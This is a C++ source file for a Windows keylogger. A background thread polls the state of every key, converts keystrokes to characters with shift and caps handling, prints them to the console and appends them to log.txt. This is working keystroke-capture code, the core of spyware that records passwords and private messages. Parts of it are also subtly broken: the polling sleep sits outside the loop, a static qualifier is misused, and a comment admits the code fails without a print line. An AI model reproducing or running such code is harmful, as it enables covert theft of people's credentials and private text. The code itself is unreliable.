#include "keylogger.h"

Keylogger::Keylogger(Keyboard* keyboard) 
	: keyboard(keyboard)
	, keylog(nullptr)
	, outputFile("log.txt", std::fstream::app) {}

void Keylogger::startKeylog() {
	auto listener = [this]() {
		while (isKeylogging()) {
			setKeysState();
			getOutput();
		}
		sleep(keyboard->polling);
	};
	keylog = new std::thread(listener);

	//IF YOU REMOVE THIS COUT LINE, THE CODE WON'T WORK. 
	std::cout << "STARTED KEYLOGGING" << std::endl;
	//DON'T ASK ME WHY
}
void Keylogger::stopKeylog() {
	std::thread* tempThread = keylog;
	keylog = nullptr;
	tempThread->join();
	delete tempThread;
}
bool Keylogger::isKeylogging() {
	return keylog != nullptr;
}

void Keylogger::setKeysState() {
	for (BYTE i = 0; i < KEYBOARDSIZE; i++) {
		Key* curkey = keyboard->keys[i];

		bool oldpressed = curkey->isPressed();
		curkey->state = GetAsyncKeyState(i);
		bool curpressed = curkey->isPressed();

		if (oldpressed != curpressed) {
			curkey->alternating = true;
		}
	}
}
void Keylogger::getOutput() {
	Key** keys = keyboard->getKeys();
	bool caps = keys[VK_CAPITAL]->isToggled();
	bool shift = keys[VK_SHIFT]->isPressed();

	bool upper = caps != shift;

	for (BYTE i = 0; i < KEYBOARDSIZE; i++) {
		Key& key = *keys[i];
		if (!key.isTriggered() || key.value == VK_SHIFT || key.value == VK_CONTROL || key.value == VK_MENU) {
			continue;
		}
		if (key.value >= 'A' && key.value <= 'Z') {
			handleOutput((char)(key.value + (upper ? 0 : CHARTOLOWER)));
			continue;
		}
		if (shift == true) {
			switch (key.value) {
			case('1'): handleOutput('!'); break;
			case('2'): handleOutput('@'); break;
			case('3'): handleOutput('#'); break;
			case('4'): handleOutput('$'); break;
			case('5'): handleOutput('%'); break;
			case('6'): handleOutput('^'); break;
			case('7'): handleOutput('&'); break;
			case('8'): handleOutput('*'); break;
			case('9'): handleOutput('('); break;
			case('0'): handleOutput(')'); break;
			case(VK_OEM_1): handleOutput(':'); break;
			case(VK_OEM_2): handleOutput('?'); break;
			case(VK_OEM_3): handleOutput('`'); break;
			case(VK_OEM_4): handleOutput('{'); break;
			case(VK_OEM_5): handleOutput('|'); break;
			case(VK_OEM_6): handleOutput('}'); break;
			case(VK_OEM_7): handleOutput('"'); break;
			case(VK_OEM_COMMA): handleOutput('<'); break;
			case(VK_OEM_PERIOD): handleOutput('>'); break;
			case(VK_OEM_MINUS): handleOutput('_'); break;
			case(VK_OEM_PLUS): handleOutput('+'); break;
			}
			continue;
		}
		handleOutput(key.description);
	}
}

template<typename T> void Keylogger::handleOutput(T output) {
	showOutput(output);
	saveOutput(output);
}
template<typename T> static void Keylogger::showOutput(T output) {
	std::cout << output;
}
template<typename T> void Keylogger::saveOutput(T output) {
	outputFile << output << std::flush;
}


